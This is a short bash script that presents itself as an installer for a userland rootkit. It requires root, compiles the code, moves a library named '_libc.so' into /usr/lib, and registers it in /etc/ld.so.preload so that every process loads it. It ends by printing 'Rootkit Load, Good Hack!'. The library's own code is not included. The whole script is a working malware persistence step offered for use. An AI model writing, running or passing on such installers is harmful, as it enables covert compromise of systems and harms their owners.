#!/usr/bin/env bash
# INSTALL ROOTKIT USERLAND

if [ $(whoami) = "root" ]; then

# Loading
echo "[+] Install"

for load in $(seq 1 3); do
echo -n "."
sleep 0.5;
done

# compilation
$(make)

# moved dynamic library for /usr/bin
mv _libc.so /usr/lib

#LD_PRELOAD
echo "/usr/lib/_libc.so" >> /etc/ld.so.preload

#clear screen
$(clear)

echo "[!] Rootkit Load, Good Hack!"

else

echo "[!] Run With ROOT!"

fi
